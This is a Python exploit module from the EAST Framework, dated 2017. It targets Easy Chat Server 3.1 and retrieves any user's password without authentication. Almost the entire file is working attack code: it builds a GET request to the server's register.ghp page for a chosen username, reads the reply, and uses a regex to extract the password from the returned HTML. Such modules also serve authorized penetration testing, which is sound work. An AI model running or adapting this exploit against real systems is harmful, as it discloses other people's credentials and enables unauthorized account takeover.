#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import re
import urllib2

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_easy_chat_server_pd"
INFO['DESCRIPTION'] = "Easy Chat Server 3.1 Password Disclosure"
INFO['VENDOR'] = "http://echatserver.com"
INFO['DOWNLOAD_LINK'] = 'http://echatserver.com/ecssetup.exe'
INFO['LINKS'] = ['https://packetstormsecurity.com/files/142884/Easy-Chat-Server-3.1-Password-Disclosure.html']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Registeration page 'register.ghp' allows disclosing ANY user's password. Remote un-authenticated attackers can send HTTP GET requests to obtain ANY Easy Chat Server user password."
"""
INFO['CHANGELOG'] = "15 Jun, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["USER"] = 'admin', dict(description = 'Username')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.user = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.user = self.args.get('USER', 'admin')
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        url = self.make_url('/register.ghp?username={}&password='.format(self.user))
        try:
            fd = urllib2.urlopen(url)
            content = fd.read()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        result = re.findall('<INPUT type="password" name="Password" maxlength="30"  value="(.+?)">', content)
        if len(result) > 0:
            self.log('Password: ' + result[0])
            self.finish(True)
        else:
            self.log('User not Found')
            self.finish(False)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
